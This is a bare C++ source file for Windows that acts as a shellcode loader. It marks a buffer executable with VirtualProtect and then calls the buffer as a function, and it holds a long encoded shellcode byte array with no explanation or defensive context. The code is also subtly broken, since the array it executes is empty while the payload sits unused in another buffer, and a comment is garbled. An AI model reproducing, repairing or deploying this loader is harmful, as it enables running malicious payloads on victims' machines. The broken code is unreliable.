#include <windows.h>

#include <iostream>

int main(int argc, char **argv) {

 char b[] = {/* �������shellcode */};

VirtualProtect(b,sizeof(b),PAGE_EXECUTE_READWRITE,0);
unsigned char buf[] = 
"\xb8\xd3\x05\xe9\xb2\xda\xcb\xd9\x74\x24\xf4\x5e\x31\xc9\x66"
"\xb9\x19\x01\x31\x46\x16\x03\x46\x16\x83\xc6\x04\x31\xf0\x34"
"\x73\x0f\xec\xf8\x66\xa4\xca\x71\xa3\xce\xb2\x52\x62\x48\xf4"
"\xb7\x75\x17\xc1\xbc\x44\x40\xd8\xbf\xf1\x6f\x38\x58\xec\x92"
"\x39\xdb\x8d\x65\xfb\xcf\x8f\xa0\x2f\x40\x3b\x96\xaf\x96\xfb"
"\xf9\xac\xc3\x2f\xeb\x0c\xec\x08\x37\x0a\xc8\xe5\x52\x24\xa4"
"\x1b\xfa\xba\x86\x2e\xf5\xd1\x7f\xd6\x88\xaa\xa1\x41\x9c\x2b"
"\x5a\x1c\x1f\xe9\x11\xbd\x24\xc8\x37\x12\x66\x2a\x4b\xba\x48"
"\xf0\x38\x58\xda\x2e\xb2\x49\xe1\x5a\x83\x6e\xaf\xc0\x32\x08"
"\xd7\x5a\xec\x32\xb9\x38\x03\x25\x43\x56\x13\x62\x95\x70\x56"
"\x63\x81\x1f\xf1\x26\xd0\x51\x28\x21\x23\x3b\x00\x9e\xcb\x17"
"\x48\x3c\xdf\x47\xbf\xbf\xaa\x03\x33\x01\x40\x4a\x91\x45\x0f"
"\xd0\x31\x14\x1b\xd5\xb1\x98\x85\xa7\x19\xa9\x08\xb3\x4e\x95"
"\x4e\x53\x76\x9a\x09\x2f\x39\xda\xe7\xd2\x04\x82\x3f\xbb\x9a"
"\x96\x50\x2f\x3a\x8b\xb3\x21\x1c\x1a\x3b\x1f\x6e\x07\xb3\xe1"
"\x27\x0d\xfb\xa8\x29\x89\xa0\x2a\xd7\x19\x0e\x54\xf4\x95\x4b"
"\xc9\x50\x9f\xfb\xbb\xad\xa7\x66\xcf\x14\xd0\xd9\xfa\x83\x80"
"\x13\x86\xc3\x9f\x25\xda\xdd\xa5\x61\x1c\x28\x0b\x16\xcf\xb7"
"\x72\x5f\x70\x15\x77\xea\xaa\xb8\xcb\xd1\x0d\xe3\xd4\xe1\x15"
"\x35\x0f\x76\xd9\xa3\x23\xa2\x60\xf4\xf7\xba\x7e\xbb\x9e\x7c"
"\x6b\x85\xac\x0b\x2c\x9c\x90\x3b\x43\x07\x6a\xd4\xd5\x36\x41"
"\x9f\x61\xa9\x8a\xf9\x31\x13\xa1\x71\x11\x78\xe3\xe9\x8b\xb5"
"\x8a\x34\xd1\x88\x79\xee\xb2\xc0\x41\xa9\x38\x0c\x3f\x9f\xbe"
"\xcc\xe1\x5e\xb4\xb6\xa7\x45\xf9\xba\x09\xd9\xcb\x51\xee\x50"
"\xda\x3a\x87\x71\xd5\x52\x8c\x3a\xb2\xcd\xb2\x90\xd2\x36\xfd"
"\xee\x0e\x9f\x28\xcb\x8e\x26\xbe\x95\xbe\x86\xef\xc7\x36\x6e"
"\xbf\x39\xfe\xf0\x02\xf1\x6a\x2f\x70\xdd\x58\x2a\x63\x1b\x58"
"\xaa\x47\x07\x28\x01\x56\xee\xb5\xf2\xea\xc4\x5a\x5b\x79\x49"
"\x2d\xf0\x37\x60\xd6\x28\x5e\xae\x0f\x0f\x4b\x75\x85\x06\xd5"
"\x97\xbd\xf6\x3b\x36\xd4\x96\x8f\x09\x7c\x1b\x1b\xea\xb4\x43"
"\xae\x2a\xd0\xeb\x39\x9b\x72\xed\x68\x3a\x45\x1b\x7b\x69\x7e"
"\x30\xee\x77\x37\x11\xe4\x6a\x4e\x4f\x5a\xaf\x45\x85\x78\xf2"
"\xf4\xd7\x8f\x0a\xe4\xe9\x14\x39\x66\x31\x7e\x4a\x53\x7e\xcf"
"\x58\x9d\x7f\x2f\x19\xc3\x7d\x5a\x62\x99\x82\x43\x64\xd7\xed"
"\x8e\x5f\x80\xa6\xcf\xf9\x07\xf5\x32\x80\x4d\xe5\x1a\x02\x7d"
"\xaf\x7d\xbf\xc1\x66\xcc\x5f\x51\x25\x2c\xed\xe0\x88\x69\xce"
"\x99\x46\xb7\xcf\x2c\x44\x12\xb1\x0d\x74\x87\x7a\x24\x7e\x68"
"\x52\xa8\xa7\xb4\xeb\x41\xce\x01\x7f\xfa\x36\xda\x5c\x3d\x0a"
"\x2a\x0b\x49\xa5\x28\x86\x2f\x66\x0b\x9d\xd5\xa4\x57\x6d\x04"
"\x06\x37\x7d\x10\xaa\x51\x27\xb4\x30\xcc\x88\x4a\xf3\xe2\x79"
"\xba\xe1\x3c\x57\x0c\xde\x91\x67\xa1\xd9\x2a\x6c\x58\x5a\x01"
"\x59\x22\x49\x1b\x99\xf9\xb3\x6c\xc6\xde\xdf\x5a\x91\x09\x0a"
"\x7d\x0e\xeb\x72\x57\x43\xd7\x6b\x65\xe2\xa2\xeb\x0a\x77\x8b"
"\xeb\x07\x4e\x2c\xb9\xda\xb6\xb6\x9e\xb1\x42\xc4\x1d\x81\xf4"
"\x4e\x09\x98\xc6\x05\x3a\x18\x77\x1a\x85\xff\x93\x33\x14\x48"
"\x87\xc3\xf3\x07\x33\xf3\x40\x10\x9d\x81\xe8\x84\x79\x0d\x84"
"\x1b\xd7\x01\x30\x09\x34\xfd\x07\x5c\xf5\xf2\x70\x9f\x2c\xe7"
"\xab\x6c\x25\x41\xe3\xf9\x5d\x2a\x22\x17\xe1\xbb\xa3\x60\xda"
"\x73\xa1\x09\xa6\xc6\xdc\xd7\x5d\x99\x75\x71\xcb\xe8\x06\x8b"
"\xc3\xfa\xcd\x84\xaf\xb8\x4f\xb0\xdf\x11\xf6\x8b\xc7\x68\xbb"
"\x9d\x80\xaa\xda\x91\x0f\xea\x47\x1a\xac\xf0\x36\xbf\x1b\xbe"
"\xf1\x58\x66\x91\xf4\x41\x00\xe9\x55\x0b\xfd\xad\xf1\xcd\xe8"
"\x3a\x53\xa3\x42\xa0\x99\xd2\x36\x0c\x75\xb1\x71\x38\x7c\xef"
"\xa3\x37\x52\xa3\xcf\x6e\xdc\x40\xcc\x4b\xd8\x59\x7e\xcd\x3b"
"\xeb\x36\x6f\xb4\xf9\x06\x9c\x70\xcb\xd3\xdc\x98\x9b\x3d\x98"
"\x1f\x1c\xb8\xc9\xc2\xf7\x2a\xb8\xba\xfd\x7a\x26\xe7\x75\x66"
"\x3a\xf8\xb7\x30\x4d\x5b\x60\xc0\x38\xba\x61\x89\x49\x61\x5b"
"\xe9\x0e\x56\x97\xe6\x26\xb4\xc5\xe5\x70\xab\x29\xfb\xcc\xe6"
"\x30\xca\xaf\xd3\x63\xbe\x2a\x6b\xfc\x7b\xc7\xcd\x44\xe8\x01"
"\x71\xc6\xd0\x40\xa0\x68\xaa\xcc\x1f\x15\x66\xa3\xcb\xb0\xb1"
"\xc3\x30\xa0\xc6\x80\x1c\x3f\xae\x7c\xa4\xc4\x81\xa3\x64\x96"
"\x8b\xd7\xa1\x35\x55\xc7\xd1\x73\x8d\x70\xf3\x55\x1a\x6f\x45"
"\x74\xf6\x44\x42\x5d\xcd\x1c\xe5\x4a\x25\xe2\xf1\x02\x07\x7a"
"\x4c\x08\x43\x94\x6f\x8a\x8d\xa4\x41\xec\x6f\xe9\x76\x77\xe8"
"\x18\x85\x7e\xe8\x42\x1b\x1c\xc8\x5b\x4d\x12\x1d\x1b\x1d\x4e"
"\x85\xb8\x42\xfe\xda\x06\x92\x10\x05\x80\xe4\x94\x7f\x69\xe5"
"\x2a\x74\xab\x38\x32\x4d\x82\x20\xa9\x97\xe3\x59\x00\xc9\x00"
"\xe5\x91\xfa\x9d\x7b\x64\x82\xce\xa0\xfb\x6e\x70\x36\xeb\xb6"
"\x66\xae\x14\x0c\x3f\xe4\x4c\x66\x40\xe2\xa5\x7a\x7f\x49\xca"
"\xd7\xff\x6e\x0e\xcb\xb2\x21\xcc\x81\x64\xf5\x18\x2b\x04\xdf"
"\x22\x7b\x56\x72\xa7\x49\x83\xb0\xfd\x78\xb1\x0d\x6f\x9c\x98"
"\x4a\x5a\xe7\x41\x60\x5a\xaf\x35\x4a\x65\x79\xe3\x88\x67\xc6"
"\xa0\x78\x5b\x5d\x66\x85\xf9\xcc\x1e\x6b\x74\xac\x25\xab\x2e"
"\xde\x6d\x32\xbd\x1d\xc7\x0c\x34\x70\x5b\xf5\x05\xf6\xcf\xcd"
"\x85\xf8\x7d\x7e\xa9\xa8\x58\x56\x00\x89\x7d\x7d\x6c\x1d\x90"
"\x61\xc4\x05\xc2\xb7\xf8\x2b\xc2\x2d\x78\x6f\xd8\x5b\x36\x76"
"\x90\x9b\xb3\x9e\x4b\x65\x50\x05\x87\x02\x6f";

 ((void(*)())b)();

}
